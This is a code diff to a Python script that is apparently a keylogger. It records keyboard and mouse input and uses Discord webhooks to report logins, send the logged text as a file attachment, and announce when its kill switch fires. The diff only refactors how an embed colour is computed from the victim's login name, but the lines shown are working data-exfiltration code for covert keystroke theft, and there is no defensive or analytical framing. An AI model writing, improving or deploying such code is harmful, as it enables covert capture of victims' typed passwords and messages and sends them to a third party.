@@ -54,6 +54,8 @@ def generate_color(name):
     b = int(hashed_name[4:6], 16)
     return "{:02X}{:02X}{:02X}".format(r, g, b)
 
+user_color = generate_color(os.getlogin())
+
 def check_if_should_send(lines):
     if lines >= max_lines:
         webhook = DiscordWebhook(url=url, username="Keys")
@@ -73,7 +75,7 @@ def check_if_should_send(lines):
                 webhook.add_file(file=file.read(), filename="raw_text.txt")
         except:
             pass
-        embed = DiscordEmbed(title=f"Logs from {os.getlogin()}", color=generate_color(os.getlogin()))
+        embed = DiscordEmbed(title=f"Logs from {os.getlogin()}", color=user_color)
         embed.set_timestamp()
         webhook.add_embed(embed)
         if clear_after_send:
@@ -293,7 +295,7 @@ def on_release(key):
     if kill_switch():
         controller.click(mouse.Button.left)
         webhook = DiscordWebhook(url=url, username="Keys")
-        embed = DiscordEmbed(title=f"Keyboard: Killswitch activated for user: {os.getlogin()}", color=generate_color(os.getlogin()))
+        embed = DiscordEmbed(title=f"Keyboard: Killswitch activated for user: {os.getlogin()}", color=user_color)
         webhook.add_embed(embed)
         webhook.execute()
         return False
@@ -313,7 +315,7 @@ def on_click(x, y, button, pressed):
     
     if kill_switch():
         webhook = DiscordWebhook(url=url, username="Keys")
-        embed = DiscordEmbed(title=f"Mouse: Killswitch activated for user: {os.getlogin()}", color=generate_color(os.getlogin()))
+        embed = DiscordEmbed(title=f"Mouse: Killswitch activated for user: {os.getlogin()}", color=user_color)
         webhook.add_embed(embed)
         webhook.execute()
         return False
@@ -328,7 +330,7 @@ if not kill_switch():
                 url = file.readline().replace("\n","").strip()
                 max_lines = int(file.readline())
             webhook = DiscordWebhook(url=url, username="Keys")
-            embed = DiscordEmbed(title=f"Connected to user: {os.getlogin()}", color=generate_color(os.getlogin()))
+            embed = DiscordEmbed(title=f"Connected to user: {os.getlogin()}", color=user_color)
             webhook.add_embed(embed)
             response = webhook.execute()
 
